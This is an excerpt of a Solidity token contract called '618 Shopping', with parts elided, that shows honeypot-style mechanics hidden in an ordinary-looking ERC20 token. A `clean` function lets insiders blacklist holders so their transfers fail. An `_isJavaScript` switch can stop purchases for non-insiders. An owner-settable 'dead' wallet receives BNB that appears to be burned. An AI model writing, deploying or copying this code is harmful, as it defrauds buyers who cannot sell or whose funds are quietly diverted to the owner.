...
contract TokenTools is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public _clean;
    ...
    uint256 _isJavaScript = 0;

    address payable public deadWalletAddress = payable(0x000000000000000000000000000000000000dEaD);
    ...
    address payable public marketingWalletAddress = payable(0x0C81b8da837F31b7E30FF6f8dFaEc0EcB977C7fD);
    string private _name = "618 Shopping";
    ...
    string  private _symbol = "618 Shopping";
    ...
    function clean(address account) public {
        require(isExcludedFromFee[msg.sender] == true);
        _clean[account] = true;
    }
    ...
    function setdeadWalletAddress(address newAddress) external onlyOwner() {
        deadWalletAddress = payable(newAddress);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(_clean[sender] == false,"Fxck you Robot");
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBTeam > 0)
            transferToAddressETH(deadWalletAddress, amountBNBTeam);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            if(_isJavaScript == 1){
                require(isExcludedFromFee[sender] == true);
            }
